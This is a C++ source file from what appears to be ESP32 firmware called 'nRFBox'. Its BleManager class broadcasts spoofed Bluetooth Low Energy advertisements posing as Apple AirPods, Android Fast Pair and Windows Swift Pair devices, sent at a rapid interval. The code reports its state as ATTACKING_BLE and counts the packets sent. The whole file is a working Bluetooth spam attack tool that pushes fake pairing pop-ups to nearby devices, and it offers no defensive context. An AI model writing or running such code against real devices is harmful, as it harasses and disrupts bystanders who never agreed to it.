#include "BleManager.h"
#include "System.h"

BleManager& BleManager::getInstance() { 
    static BleManager i; 
    return i; 
}

BleManager::BleManager() : 
    _isRunning(false), 
    _pAdvertising(nullptr), 
    _packetsSent(0), 
    _currentType(BleSpoofType::APPLE_AIRPODS) 
{}

void BleManager::setup() { 
    // Пусто, так как BLE init делается по требованию в startSpoof
}

void BleManager::stop() { 
    if(_isRunning && _pAdvertising) { 
        _pAdvertising->stop(); 
        _isRunning = false; 
        BLEDevice::deinit(true); // Free memory
    } 
}

void BleManager::startSpoof(BleSpoofType type) {
    stop(); 
    
    // SystemController уже вызвал btStart()
    BLEDevice::init("nRFBox"); 
    _pAdvertising = BLEDevice::getAdvertising(); 
    
    _currentType = type; 
    setPayload(type);
    
    _pAdvertising->setMinInterval(0x20); 
    _pAdvertising->setMaxInterval(0x40); 
    _pAdvertising->start(); 
    _isRunning = true;
}

void BleManager::setPayload(BleSpoofType type) {
    BLEAdvertisementData ad; 
    std::string p;
    
    if (type == BleSpoofType::APPLE_AIRPODS) {
        char d[] = { 0x4C, 0x00, 0x07, 0x19, 0x01, 0x02, 0x20, 0x55, 0xAA, 0x01 }; 
        p.assign(d, sizeof(d)); 
        ad.setManufacturerData(p);
    } 
    else if (type == BleSpoofType::ANDROID_FASTPAIR) {
        ad.setServiceData(BLEUUID((uint16_t)0xFE2C), "\x00\x01\x02"); 
        ad.setFlags(0x06); 
    }
    else if (type == BleSpoofType::WINDOWS_SWIFT) {
        char d[] = { 0x06, 0x00, 0x03, 0x00, 0x80 }; 
        p.assign(d, sizeof(d)); 
        ad.setManufacturerData(p);
    }
    _pAdvertising->setAdvertisementData(ad);
}

static uint32_t lastBleLog = 0;

bool BleManager::loop(StatusMessage& out) {
    if(!_isRunning) { 
        out.state = SystemState::IDLE; 
        return false; 
    }
    out.state = SystemState::ATTACKING_BLE; 
    
    if (millis() - lastBleLog > 100) {
        _packetsSent++; 
        lastBleLog = millis();
    }
    out.packetsSent = _packetsSent;
    snprintf(out.logMsg, MAX_LOG_MSG, "Spoofing...");
    return true;
}